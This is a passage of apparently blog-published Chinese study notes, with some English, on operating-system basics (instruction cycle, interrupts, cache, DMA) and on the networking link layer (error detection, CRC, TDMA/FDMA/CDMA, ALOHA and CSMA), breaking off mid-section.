class=""></li><li><p>数字信号处理器</p><p>对流信号（如音频、视频）进行处理</p></li><li><p>其他专门的计算装置（固定功能单元）与CPU共存，用来支持其他标准的一些计算，如：</p><ul><li>编码/解码语音和视频（多媒体数字信号编码器/解码器）</li><li>提供对加密和安全技术的支持</li></ul></li><li><p>传统微处理器正在被片上系统（便携）所取代:</p><p>CPU和高速缓存在一个芯片上</p><p>系统中的多数其他硬件也在此芯片上，如数字信号处理器、图像处理单元、I/O装置（无线电和多媒体数字信号编码器/解码器）、内存</p></li></ul><h1>指令的执行</h1><ul><li><p>一组（保存在存储器中的）指令—&gt;（处理器执行的）程序</p><p>（不断重复）取指令+执行指令—&gt;程序执行</p></li><li><p>最简单的指令处理：</p><p>1、处理器从存储器中一次读取一条指令</p><p>2、执行每条指令</p></li><li><p>指令周期</p><ul><li>单个指令所需要的处理</li><li>取指阶段 + 执行阶段</li><li>仅当机器关机、发生某些未知错误、遇到与停机相关的程序指令时，程序执行才会停止</li><li>程序计数寄存器<ul><li>Program Counter，PC</li><li>保存下一次要取的地址</li><li>若非出现其他情况，处理器会在每次取指后递增PC，以便能按顺序取下一条指令（即位于下一个存储器地址的指令）</li></ul></li><li>指令寄存器<ul><li>Instruction Register，IR</li><li>存放取到的指令（指令中包含处理器将要执行的操作的位，处理器解释指令并执行相应的操作）</li></ul></li></ul></li><li><p>例：累加，把地址为940的内存单元中的内容与地址为941的内存单元中的内容相加，并将结果保存在后一个单元中</p><p>AC：累加器（数据寄存器）</p><p>程序计数器（PC）=指令的地址</p><p>指令寄存器（IR）=正在被执行的指令</p><p>累加器（AC）=临时存储</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/162217.jpg" class=""></li></ul><h1>中断</h1><h5 id="分类">分类</h5><table><thead><tr><th>类型</th><th>定义</th></tr></thead><tbody><tr><td>程序中断</td><td>在某些条件下由<strong>指令执行</strong>的结果产生，如算数溢出、除数为0、试图执行一条非法机器指令及访问用户不允许的存储器位置</td></tr><tr><td>时钟中断</td><td>由处理器内部的<strong>计时器</strong>产生，允许操作系统以一定的规律执行函数</td></tr><tr><td>I/O中断</td><td>由I/O控制器产生，用于发信号通知一个操作的正常完成或各种错误条件</td></tr><tr><td>硬件失效中断</td><td>由诸如掉电或存储器奇偶校验错之类的故障产生</td></tr></tbody></table><h5 id="中断和指令周期">中断和指令周期</h5><ul><li><p>例：WRITE调用</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/1.6.jpg" class=""></li></ul><p>中断处理程序执行过程中，外部设备忙于从计算机存储接收数据并打印，这种I/O操作和用户程序中指令的执行是<strong>并发</strong>的</p><p>过程：1、外部设备做好服务的准备（准备好从处理器接收更多数据）</p><p>​2、外部设备的I/O模块给处理器发送一个中断请求信号</p><p>​3、处理器响应：</p><p>​  暂停当前程序的处理</p><p>​   处理服务于特定I/O设备的程序（中断处理程序，interrupt handler）</p><p>​4、完成对设备的服务响应后，处理器恢复原先的执行</p><ul><li><p>中断可在主程序中的任何位置而非仅在一条特定指令处发生</p></li><li><p>处理器检查是否出现中断信号：</p><ul><li><p>无中断：</p><p>处理器继续运行，并在取值周期取当前程序的下一条指令</p></li><li><p>有中断：</p><p>处理器挂起当前程序的执行，并执行一个<em>中断处理程序</em>（通常是操作系统的一部分，确定中断的性质并执行所需要的操作）</p></li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/1.7.jpg" class=""><h5 id="中断处理">中断处理</h5><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/112018.jpg" class=""><ul><li><p>PSW：程序状态字</p></li><li><p>PC：程序计数器</p></li><li><p>控制权交到中断处理程序后，该程序执行会引起以下操作：</p><ul><li><p>系统栈中的信息：</p><ul><li>与被中断相关的程序计数器</li><li>PSW</li><li>一些其他信息被当作正在执行的程序中的一部分</li><li>与处理寄存器相关的内容（中断处理程序可能用到这些寄存器）</li></ul></li><li><p>中断处理程序开始处理中断：</p><ul><li>检查与I/O操作相关的状态信息或其他引起中断的事件</li><li>可能包括给I/O设备发送附加命令或应答</li></ul></li><li><p>中断处理结束后：</p><p>被保存的寄存器值从栈中释放并恢复到寄存器中</p></li><li><p>从栈中恢复PSW和程序计数器的值</p><p>（因此下一条要执行的指令来自前面被中断的程序）</p></li></ul></li></ul><h5 id="多个中断">多个中断</h5><p>处理多个中断的方法：</p><ul><li><p>正在处理一个中断时，禁止再发生中断：</p><ul><li><p>处理器检查是否还有中断发生</p></li><li><p>所有中断都严格按照顺序处理</p></li><li><p>缺点：未考虑相对优先级和时间限制的要求</p><p>例如，当来自通信线的输入到达时可能需要快速接收，以便为更多的输入让出空间。如果在第二批输入到达时第一批输入还未处理完，就可能由于I/O设备的缓冲区装满或溢出而丢失数据</p></li></ul></li><li><p>定义中断优先级，允许高优先级中断打断低优先级中断</p></li></ul><h1>存储器的层次结构</h1><ul><li>存储器评价：<ul><li>容量：供应用程序使用</li><li>速度：存储器的速度要跟得上处理器的速度</li><li>价格</li></ul></li><li>技术关系：<ul><li>存取事件快，每“位”价格高</li><li>容量大，每“位”价格低</li><li>容量大，存取速度慢</li></ul></li><li>典型的<em>存储器层次结构（memory hierarchy）</em>：</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/1.14.jpg" class=""><h1>高速缓存</h1><h5 id="动机">动机</h5><p>就目前而言，处理器速度的提高一直快于存储器访问速度的提高。理想情况下，内存的构造技术可采用与处理器中的寄存器相同的构造技术，这样内存的存储周期才跟得上处理周期（但成本高）</p><p>解决办法：利用构造性原理（principal of locality），即在内存之间提供一个容量小且速度快的存储器，称为高速缓存</p><h5 id="高速缓存原理">高速缓存原理</h5><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/1.16.jpg" class=""><ul><li><p>内存：容量相对较大但速度较慢</p><p>高速缓存：容量较小但速度较快，包含一部分内存数据的副本</p></li><li><p>处理器读取存储器中的一个字节或字之前：检查—&gt;确定该字或字节是否在高速缓存中</p><ul><li><p>在：</p><p>该字节/字从高速缓存传递给处理器</p></li><li><p>不在：</p><p>1、将由固定数目的字节/字组成的一块内存数据读入高速内存</p><p>2、该字节/字从高速内存传递给处理器</p></li></ul></li><li><p>根据<strong>访问局部性原理</strong>，当一块数据被取入高速缓存以满足一次存储器访问时，很可能紧接着的多次访问的数据是该块中的其他字节</p></li></ul><h1>高速缓存设计</h1><h1>直接内存存取</h1><h5 id="执行I-O操作的技术">执行I/O操作的技术</h5><ul><li>可编程I/O</li><li>中断驱动I/O</li><li>直接内存存取（DMA）</li></ul><h5 id="可编程I-O操作（programmed-I-O）">可编程I/O操作（programmed I/O）</h5><ul><li>I/O模块执行请求的动作并设置I/O状态寄存器中相应的位</li><li>不会进一步通知处理器</li><li>不会中断处理器</li><li>处理器在执行I/O指令后，要定期检查I/O模块的状态，以确定I/O操作是否完成</li><li>缺点：<ul><li>处理器要等很长时间来缺点I/O模块是否做好了接收或发送更多数据的准备</li><li>处理器在等待期间必须不断询问I/O模块的状态，会降低整个系统的性能</li><li>I/O传送速度受限于处理器测试设备和提供服务的速度</li><li>处理器忙于管理I/O传送的工作，必须执行很多指令以完成I/O传送</li></ul></li></ul><h5 id="中断驱动I-O（interrupt-driven-I-O）">中断驱动I/O（interrupt-driven I/O）</h5><ul><li>处理器给I/O模块发送I/O命令，然后处理器忙其他有用的事情</li><li>I/O模块准备好与处理器交换数据时，打断处理器的执行并请求服务</li><li>缺点：<ul><li>任何数据传送都必须完全通过处理器</li><li>I/O传送速度受限于处理器测试设备和提供服务的速度</li><li>处理器忙于管理I/O传送的工作，必须执行很多指令以完成I/O传送</li></ul></li></ul><h5 id="直接内存存取（Direct-Memory-Access，DMA）">直接内存存取（Direct Memory Access，DMA）</h5><ul><li>需要大量移动数据时更有效</li><li>DMA功能可以由系统总线中的一个独立模块完成，也可以并入一个I/O模块中</li><li>过程：<ul><li>处理器读或写一块数据时，给DMA模块产生一条命令，发送：<ul><li>是否请求一次读或写</li><li>所涉I/O设备的地址</li><li>开始读或写的存储单元</li><li>需要读或写的字数</li></ul></li><li>处理器继续其他工作</li><li>DMA模块直接与存储器交互，发送整个数据块，每次传送一个字</li><li>传送完成后，DMA模块向处理器发送一个中断信号</li></ul></li><li>只有在开始传送和传送结束时处理器才会参与</li><li>DMA需要<strong>控制总线</strong>来与存储器进行数据传送</li><li>由于在总线使用中存在竞争，当处理器需要使用总线时，要等待DMA模块（并非中断，处理器没有保存上下文环境去做其他事，而只是暂停一个总线周期[在总线上传输一个字的时间]）</li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第五章-链路层</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/</url>
    
    <content type="html"><![CDATA[<p>two fundamentally different types of link-layer channels：</p><p>1、<strong>broadcast channels</strong>，广播信道</p><ul><li>common in <strong>local area networks (LANs)</strong>, <strong>wireless LANs</strong>, <strong>satellite networks</strong>, and **hybrid fiber-coaxial cable(HFC)**access networks</li></ul><p>2、<strong>point-topoint communication link</strong>，点对点通信链路</p><p>our goals</p><ul><li>understand principles behind link layer services<ul><li>error detection, correction (纠错)</li><li>sharing a broadcast channel: multiple access</li><li>link layer addressing</li><li>local area networks: Ethernet, VLANs</li></ul></li><li>instantiation(实例), implementation of various link  layer technologies</li></ul><h1>5.1 Link Layer: Introduction and Services</h1><p>术语：</p><ul><li>hosts, routers, and switch: <strong>nodes (节点)</strong></li><li>communication channels (信道)  that connect adjacent (邻近)  nodes along communication path:  links (链路 )<ul><li>wired links</li><li>wireless links</li></ul></li><li>layer -2 packet: frame( 帧), encapsulates datagram</li><li>data-link layer has responsibility of  transferring datagram from one <u>node</u>  to <strong>physically adjacent</strong> <u>node</u> over a link</li><li>datagram transferred by different link protocols over different links:<ul><li>e.g., <strong>Ethernet</strong> on <strong>first link</strong></li><li><strong>frame relay (帧中继)</strong> on <strong>intermediate links</strong></li><li><strong>802.11</strong> on <strong>last link</strong> (<strong>无线局域网协议</strong>)</li></ul></li><li>each link protocol provides  different services<ul><li>e.g., <u>may</u> or <u>may not</u> provide <strong>rdt</strong> over link</li></ul></li></ul><h3 id="5-1-1-The-Services-Provided-by-the-Link-Layer">5.1.1 The Services Provided by the Link Layer</h3><ul><li><p><strong>Framing（组帧）</strong></p><ul><li>encapsulate datagram into frame, <strong>adding header(头部)</strong>, <strong>trailer  (尾部)</strong></li><li>“MAC” addresses used in frame headers to <strong>identify source,  dest</strong><ul><li>different from IP address!</li></ul></li></ul></li><li><p><strong>link access(链路接入)</strong></p></li><li><p>channel access if shared medium</p></li><li><p><strong>MAC (medium access control, 媒体访问控制) protocol</strong> <u>specifies the rules</u> by which a frame is transmitted onto link，规定了帧在链路上传输的规则</p></li><li><p>【理想情况】MAC protocol is <strong>simple</strong>, sender can send a frame <strong>whenever the link is idle</strong></p></li><li><p><strong>reliable delivery (可靠交付)</strong> between adjacent  nodes</p><ul><li><p>When a link-layer protocol provides reliable delivery service, it <u>guarantees</u> to move <u>each</u> network-layer datagram across the link <strong>without error</strong></p></li><li><p>we learned how to do this already (chapter 3)!</p></li><li><p>Similar to a transport-layer reliable delivery service, a link-layer reliable delivery service is often achieved with <strong>acknowledgments</strong> and <strong>retransmissions</strong></p></li><li><p>seldom used on <strong>low bit-error link</strong> (fiber,coax, some twisted  pair)</p><ul><li>be considered an <strong>unnecessary overhead</strong> ,不必要的开销</li></ul></li><li><p>often used wireless links: high error rates</p><ul><li>with the goal of correcting an <strong>error locally</strong>—on the link where the error occurs—rather than forcing an end-toend retransmission of the data by a transport-or application-layer protocol, 本地纠正一个差错</li></ul></li></ul></li><li><p><strong>flow control (流量控制)</strong></p><ul><li>pacing between <u>adjacent</u> sending and receiving nodes</li></ul></li><li><p><strong>error detection (错误检测)</strong></p><ul><li>errors caused by <strong>signal attenuation (衰减)</strong>, <strong>noise(噪音)</strong></li><li>receiver detects presence(存在) of errors<ul><li>signals sender for retransmission or drops frame</li></ul></li><li>sophisticated (复杂), <strong>usually implemented in hardware</strong></li></ul></li><li><p><strong>error correction (错误纠正)</strong></p><ul><li>receiver <strong>identifies and corrects</strong> bit error(s) without  resorting(依靠) to retransmission</li></ul></li><li><p><strong>half-duplex and full-duplex (半双工和全双工)</strong></p></li><li><p>with half duplex, nodes at both ends of link can transmit, but not at same time (比较：全双工是双向同时传输)</p></li></ul><h3 id="5-1-2-Where-Is-the-Link-Layer-Implemented">5.1.2 Where Is the Link Layer Implemented?</h3><ul><li><p>the link layer is implemented in a <strong>network adapter(网络适配器)</strong>, also sometimes known as a <strong>network interface card (NIC，网络接口卡)</strong></p></li><li><p>the <strong>heart</strong> of the network adapter is the <strong>link-layer controller</strong>(链路层控制器)</p><ul><li><p>usually a single, special-purpose <strong>chip</strong> that implements many of the link-layer services (framing, link access, flow control, error detection, etc</p><p>→much of a link-layer controller’s functionality is <strong>implemented in hardware</strong></p></li><li><p>Ethernet card, 802.11 card Ethernet chipset</p></li><li><p>implements link, physical  layer</p></li></ul></li><li><p>attaches into host’s system buses(系统总线)</p><p>combination of <strong>hardware and software (CPU)</strong></p></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net5.2.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net5.3.jpg" class=""><ul><li>sending side<ul><li><strong>encapsulates</strong> datagram in  frame</li><li>adds error checking bits, rdt, flow control, etc</li></ul></li><li>receiving side<ul><li>looks for errors, rdt, flow control, etc</li><li><strong>extracts</strong>(提取) datagram, passes to upper layer at receiving side</li></ul></li></ul><h1>5.2 Error-Detection and -Correction Techniques，差错检测和纠正技术</h1><ul><li><p><strong>bit-level error detection and correction(比特级差错检测和纠正)</strong>：detecting and correcting the corruption(损坏) of bits in a link-layer frame sent from one <u>node</u> to another <strong>physically connected neighboring</strong> <u>node</u>—are two services often provided by the link layer</p></li><li><p><strong>EDC= Error Detection and Correction bits错误检测和纠正位 (redundancy)</strong></p><p>D = <strong>Data</strong> <u>protected by error checking</u>, may include header fields</p></li><li><p>the data to be protected includes not only the datagram <u>passed down from the network layer</u> for transmission across the link, but also <strong>link-level addressing information</strong>(链路帧首部中的链路级的寻址信息), <strong>sequence numbers</strong>, and other fields <u>in the link frame header</u></p></li><li><p><strong>Both D and EDC</strong> are sent to the receiving node in a link-level frame. At the receiving node, a sequence of bits, <strong>D’and EDC’</strong> is received. Note that D’and EDC’may <strong>differ</strong> from the original D and EDCas a result of in-transit <strong>bit flips</strong>(比特翻转)</p></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net5.4.jpg" class=""><ul><li><p>Error-detection and correction technigues allow the receiver to <strong>sometimes, but not always,</strong> detect that bit errors have occurred</p><p>→Even with the use of error-detection bits there still <strong>may be undetected bit errors</strong></p><p>receiver may be unaware → deliver a corrupted datagram to the <strong>network layer</strong></p></li><li><p>three techniques for detecting errors</p><ul><li><strong>Parity checking，奇偶校验</strong>, (to illustrate the basic ideas behind error detection and correction)</li><li><strong>Internet checksum，校验和</strong>，(typically used in the <u>transport layer</u>)</li><li><strong>Cyclic redundancy check，循环冗余检测</strong>, (typically used in the link layer in an <u>adapter</u>)</li></ul></li></ul><h3 id="5-2-1-Parity-Checking">5.2.1 Parity Checking</h3><ul><li><p>工作原理：even parity scheme (偶校验方案): the total number of 1s in <strong>d+1</strong>  bits is even, odd parity scheme (奇校验方案) is similar</p></li><li><p>Q: if an odd numbers of 1s are found  in even parity scheme, what does that  mean?</p></li></ul><p>A: some <strong>odd number</strong> of bit errors have  occurred</p><ul><li><p>the probability of undetected errors in a frame protected by single-bit parity can approach <strong>50%</strong></p></li><li><p>two-dimensional(二维) bit parity:</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net5.5.jpg" class=""><ul><li>d bits in D are divided into i rows  and  j columns, i+j+1 parity bits  comprise error -detection bits  detect and correct single bit  errors</li><li>detect any combination of two errors (can not correct!)</li><li>ability of detection and correction is known as <strong>forward  error correction (FEC,向前纠错 )</strong></li><li>commonly used in <strong>audio CDs</strong></li></ul></li></ul><h3 id="5-2-2-Checksumming-Methods">5.2.2 Checksumming Methods</h3><ul><li><p>goal: detect “errors” (e.g., flipped bits翻转位) in transmitted packet (note: used at <u>transport layer</u> <strong>only</strong>)</p></li><li><p>sender:</p><ul><li>treat segment contents  as <strong>sequence of 16-bit  integers</strong></li><li>checksum: addition (<strong>1’s complement sum反码运算</strong>)  of segment contents(这个和的反码形成了携带在报文段首部的因特网检验和)</li><li>sender puts checksum  value into UDP checksum field</li></ul></li><li><p>receiver</p><ul><li>compute checksum of  received segment</li><li>check if computed checksum  equals checksum field value<ul><li>NO - error detected</li><li>YES - no error detected.  <u>But maybe errors  nonetheless?</u></li></ul></li></ul></li><li><p>特点</p><ul><li>Checksumming methods require relatively <strong>little packet overhead</strong>（相对小的分组开销）</li><li>provide <strong>relatively weak protection</strong> against errors as <u>compared with cyclic redundancy check</u></li></ul></li><li><p>why is checksumming not used at  link layer?</p><p>A: link layer implemented in dedicated(特定的) hardware can perform more complex CRC operations</p><p>（transport-layer error detection is implemented in software, it is important to have a simple and fast error-detection scheme such as checksumming）</p></li></ul><h3 id="5-2-3-Cyclic-Redundancy-Check-CRC">5.2.3 Cyclic Redundancy Check(CRC)</h3><ul><li><p>all CRC calculations are done in modulo-2 arithmetic （模 2运算）without carries addition or borrows in  subtraction (要点：加法中不进位，减法中不借位！！！)</p></li><li><p>已知待传输数据D和生成式G，计算CRC冗余位R？</p><p>计算过程：</p><p>（1）将数据D左移r位（相当于在D后面添加r个0），注意r的值等于G的位数减1</p><p>（2）将左移r位后的D与G进行模2除法运算</p><p>（3）判断除法的余数结果是否有r位，如果没有则在高位用0补足r位，得到余数，即CRC冗余位R</p></li></ul><h1>5.3 Multiple Access Protocols</h1><ul><li><p>two types of network links</p><p>:one:A <strong>point-to-point link</strong>(点对点链路) consists of a single sender at one end of the link and a single receiver at the other end of the link</p><ul><li>Many <strong>link-layer protocols</strong> have been designed for point-to-point links<ul><li><strong>point-to-point protocol (PPP，点对点协议)</strong></li><li><strong>high-level data link control (HDLC，高级数据链路控制)</strong></li></ul></li></ul><p>:two: <strong>broadcast link，广播链路</strong></p><ul><li>can have <u>multiple</u> sending and receiving nodes all connected to the <strong>same</strong>, <strong>single</strong>, <strong>shared</strong> broadcast channel</li><li>The term <code>broadcast</code> is used here because when any one node transmits a frame, the channel <strong>broadcasts the frame</strong> and <u>each of the other nodes</u> <strong>receives a copy</strong></li><li>old-fashioned Ethernet</li><li>802.11 wireless LAN</li></ul></li><li><p>how to coordinate(协调) the access of multiple sending and receiving nodes to a shared broadcast channel—the multiple access problem</p></li><li><p><strong>multiple access protocols(MAC，多路访问协议)</strong></p><ul><li><p>used for nodes regulate(规范) their transmission into the shared broadcast channel</p></li><li><p>multiple access protocols are needed in a wide variety of network settings：including both <strong>wired</strong> and <strong>wireless local area networks</strong>, and <strong>satellite networks</strong></p></li><li><p><strong>single</strong> shared broadcast channel</p></li><li><p><strong>two or more simultaneous transmissions</strong> by nodes:  <strong>interference(干扰)</strong></p><ul><li><strong>collision (冲突)</strong> if node receives two or more signals <strong>at the same time</strong></li><li><strong>all</strong> the frames involved in the collision are <strong>lost</strong></li><li>the broadcast channel is <strong>wasted</strong> during the collision interval</li></ul></li><li><p><u>multiple access protocol (作用)</u></p><ul><li><strong>distributed algorithm</strong> that determines how nodes share channel, i.e., determine when node can transmit</li><li>communication about channel sharing must use channel itself! 利用通信信道本身来协商<ul><li><strong>coordinate</strong>(协调) the transmissions of the active nodes</li></ul></li></ul></li></ul></li><li><p>An ideal multiple access  protocol</p><ul><li><p>given: broadcast channel of rate R bps</p></li><li><p>desiderata:</p><ol><li><p>when one node wants to transmit, it can send  at rate <strong>R</strong></p></li><li><p>when <strong>M</strong> nodes want to transmit, each can send  at average rate <strong>R/M</strong></p></li><li><p>fully <strong>decentralized</strong> (去中心化):</p><p><strong>no</strong> special node to <strong>coordinate</strong> transmissions</p><p><strong>no synchronization</strong>(同步) of clocks, slots</p></li><li><p><strong>simple</strong></p></li></ol></li></ul></li><li><p>MAC protocols:  taxonomy (分类)</p><p>three broad classes:</p><ul><li><strong>channel partitioning protocol (信道划分协议)</strong><ul><li>divide channel into smaller “<strong>pieces</strong>” (time slots,  frequency, code)</li><li>allocate channel piece to node for <strong>exclusive use (独享)</strong></li></ul></li><li><strong>random access protocol (随机访问协议)</strong><ul><li>channel not divided, <strong>allow collisions</strong></li><li>“ <strong>recover</strong>” from collisions</li></ul></li><li><strong>“taking turns” protocol (轮流协议)</strong><ul><li>nodes <strong>take turns</strong>, but nodes with <strong>more to send</strong> can  take <strong>longer turns</strong></li></ul></li></ul></li></ul><h3 id="5-3-1-Channel-Partitioning-Protocols">5.3.1 Channel Partitioning Protocols</h3><ul><li>two techniques that can be used to partition(划分) a broadcast channel’s bandwidth among all nodes sharing that channel： <strong>time-division multiplexing (TDM)、frequency-division multiplexing (FDM)</strong></li></ul><p>:one:TDMA: time division multiple access (时分多路访问)</p><ul><li><p>TDM divides time into time frames and further divides each time frame into N time slots. (The TDM time frame should not be confused with the link-layer unit of data exchanged between sending and receiving adapters. which is also called a frame)</p></li><li><p>access to channel (R bps) in “rounds”</p></li><li><p>each station(节点) gets fixed length slot (length =  single pkt trans time) in each round</p></li><li><p>unused slots go <strong>idle</strong>(空闲)</p></li><li><p>example: 6-station LAN, 1,3,4 have pkt, slots 2,5,6 idle</p><img src="%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821.assets/net1.jpg" alt="net1" style="zoom:67%;" /></li><li><p>优点</p><ul><li><strong>eliminates collisions</strong> and is <strong>perfectly fair</strong>: Each node gets a dedicated transmission rate of <strong>R/N bps</strong> during each frame time</li></ul></li><li><p>Drawbacks (缺点)</p><ul><li>a node is <strong>limited</strong> to an average rate of <strong>R/N</strong> although it  is the <strong>only node</strong> with data to send</li><li>a node must <strong>wait for</strong> its turn in the transmission  sequence even it is <strong>only node with a frame</strong> to send</li></ul></li></ul><p>:three:FDMA: frequency division multiple access (频分多路访问)</p><ul><li>channel spectrum(频谱) divided into <strong>frequency bands(频段)</strong></li><li>each station assigned <strong>fixed frequency band</strong></li><li><strong>unused</strong> transmission time in frequency bands <strong>go idle</strong></li><li>example: 6-station LAN, 1,3,4 have pkt, frequency bands  2,5,6 idle</li><li><u>same drawbacks</u> with TDMA</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net2.jpg" class=""><p>:three:CDMA: code division multiple access (码分多路访问)</p><ul><li>assign <strong>different codes</strong> to each node</li><li>node use <strong>unique</strong> code to <strong>encode</strong> data it sends</li><li>different node <strong>can transmit simultaneously</strong> (各自对应的接收方可正确接受发送方编码后的数据， 而不在乎其他节点的干扰传输)</li><li>used in <strong>military systems(军用系统)</strong>, <strong>cellular telephony(蜂窝电话)</strong></li></ul><h3 id="5-3-2-Random-Access-Protocols">5.3.2 Random Access Protocols</h3><ul><li>when node has packet to send</li><li>transmit at <strong>full channel data rate R</strong></li><li><strong>no a priori coordination</strong>(协调) among nodes</li><li>two or more transmitting nodes ➜ “<strong>collision</strong>”(允许冲突出现)<ul><li>waits a random delay before retransmitting the frame</li></ul></li><li>random access MAC protocol specifies(说明):<ul><li>how to <strong>detect collisions</strong></li><li>how to <strong>recover from collisions</strong> (e.g., via random delayed  retransmissions)</li></ul></li><li>examples of random access MAC protocols:<ul><li>slotted ALOHA</li><li>ALOHA</li><li>CSMA, CSMA/CD, CSMA/CA</li></ul></li></ul><p>:one:Random access protocols -I: <strong>Slotted(时隙) ALOHA</strong></p><ul><li>assumptions (假设)：</li></ul><ol><li>all frames same size <strong>L</strong></li><li>time divided into equal size <strong>slots L/R (time to  transmit 1 frame)</strong></li><li>nodes start to transmit only <strong>slot beginning</strong></li><li>nodes are <strong>synchronized</strong>( 每个节点都知道时隙何时开始)</li><li>if 2 or more nodes  transmit in slot, all nodes <strong>detect collision</strong> before slot <strong>ends</strong></li></ol><ul><li><p>operation (操作)：</p><ul><li>when node has fresh frame  to send, transmits in next  slot<ul><li>if no collision: node can  send new frame in next  slot</li><li>if collision: node  retransmits frame in  each subsequent slot with  prob. p є(0,1) until  success</li></ul></li></ul></li><li><p>例</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net3.jpg" class=""></li><li><p>Pros(支持者):</p><ul><li><strong>single active node</strong> can  continuously transmit <strong>at  full rate</strong> of channel</li><li><strong>highly</strong> decentralized 高度分散的(并非完全): only slots in nodes (所有节点的时隙)need to be in sync<ul><li>each node <strong>detects</strong> collisions and <u>independently</u> decides <strong>when to retransmit</strong></li></ul></li><li>simple</li></ul></li><li><p>Cons(反对者)</p><ul><li><strong>collisions</strong>, <strong>wasting</strong> slots</li><li><strong>idle</strong> slots</li><li>nodes may be able to  <strong>detect collision in less than time</strong> to transmit  packet</li><li>clock <strong>synchronization</strong></li></ul></li><li><p>Slotted ALOHA:  efficiency</p><ul><li>efficiency: long-run  fraction of successful slots  (many nodes, all with many  frames to send)</li><li>suppose: <strong>N</strong> nodes with  many frames to send,  each transmits in slot  with probability <strong>p</strong></li><li>prob that <strong>given node</strong> has  success in a slot = p(1- p)^N-1^</li><li>prob that <strong>any node</strong> has a  success = Np(1-p)^N-1^</li><li>max efficiency: find p* that maximizes  Np(1-p)^N-1^</li><li>for many nodes, take  limit of Np*(1-p*)^N-1^ as  N goes to infinity, gives: <strong>max efficiency = 1/e =  0.37</strong></li><li><strong>at best</strong>: channel used for useful  transmissions 37% of time!</li></ul></li></ul><p>:two:Random access protocols -II: <strong>Pure (unslotted) ALOHA</strong></p><ul><li>Pure(unslotted) Aloha: simpler, <strong>no synchronization (完全去中心化)</strong>，, fully decentralized，完全分散</li><li>operation (操作)：when frame first arrives (datagram from  network-layer)<ul><li>transmit <strong>immediately</strong></li><li>if collision, <strong>immediately retransmit</strong> the frame with probability <strong>p</strong></li><li>otherwise, wait for <strong>a frame transmission time</strong> with probability <strong>1-p</strong></li><li>until succeed</li></ul></li><li>collision probability increases:<ul><li>frame sent at t0 collides with other frames sent in <strong>[t0 -1,t0 +1]</strong></li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net4.jpg" class=""><ul><li><p>Pure ALOHA efficiency</p><ul><li><p>P(success by given node) = P(node transmits)</p><p>​                                             × P(no other node transmits in [t0 -1,t0 ]</p><p>​                                             ×P(no other node transmits in [t0 ,t0 +1]</p><p>​                                             = p × (1-p)^N-1^(1-p)^N-1^ = p × (1-p)^2(N-1)^</p><p>P(success for any node) = Np(1-p)^2(N-1)^</p><p>… choosing optimum p and then letting n → ∞ = 1/(2e) = 0.18</p><p>→ even worse than slotted Aloha!</p></li></ul></li></ul><p>:three:Random access protocols -III: <strong>CSMA</strong></p><p><code>In both slotted and pure ALOHA,a node's decision to transmit is made independently of the activity of the other nodes attached to the broadcast channel</code></p><p><code> In particular, a node neither pays attention to whether another node happens to be transmitting when it begins to transmit,nor stops transmitting if another node begins to interfere with its transmission</code></p><ul><li><p><strong>CSMA(carrier sense multiple access,载波侦听多路访问)</strong>: <strong>listen before transmit</strong></p></li><li><p>operation (操作)：</p><p>(a) if channel sensed <strong>idle</strong>: transmit entire frame (在传输数据之前先侦听信道是否空闲)</p><p>(b) if channel sensed <strong>busy</strong>, <strong>defer</strong> transmission (推迟传输) with <strong>random time</strong> and <strong>sense</strong> the channel, <strong>until sense idle</strong>, then transmit entire frame (如果发现信道中有其他节点正在传输数据，等待一段随机时间后再侦听信道，直到侦听到信道空闲时在传输数据)</p></li><li><p>human analogy: don’t interrupt others!</p></li><li><p>collisions can still occur:</p><ul><li><strong>propagation delay</strong> means two nodes <strong>may not</strong> hear  each other’s transmission</li><li>two nodes transmit data at  the <strong>same time</strong></li></ul></li><li><p><strong>collision</strong>: entire packet  transmission time wasted</p><ul><li><strong>distance &amp; propagation</strong>  delay play role in in  determining collision  probability</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net5.jpg" class=""><p>Drawback：B and D continue to transmit their entire  frames although collision has occurred</p><p>:four:Random access protocols -III: 